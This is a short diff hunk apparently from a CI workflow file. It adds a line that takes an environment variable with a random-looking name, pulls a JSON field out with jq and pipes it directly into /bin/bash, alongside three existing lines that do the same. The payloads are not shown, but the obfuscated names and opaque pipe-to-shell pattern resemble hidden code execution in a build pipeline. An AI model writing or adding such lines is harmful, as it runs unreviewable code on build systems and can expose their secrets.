@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$qkryk24" | jq -r .kvpl7 | /bin/bash
           printf '%s' "$wykk93" | jq -r .klg1 | /bin/bash
           printf '%s' "$c812" | jq -r .rk17 | /bin/bash
+          echo $gscm24341 | jq -r .axqf91 | /bin/bash
 
       - name: Archive output
         if: always()
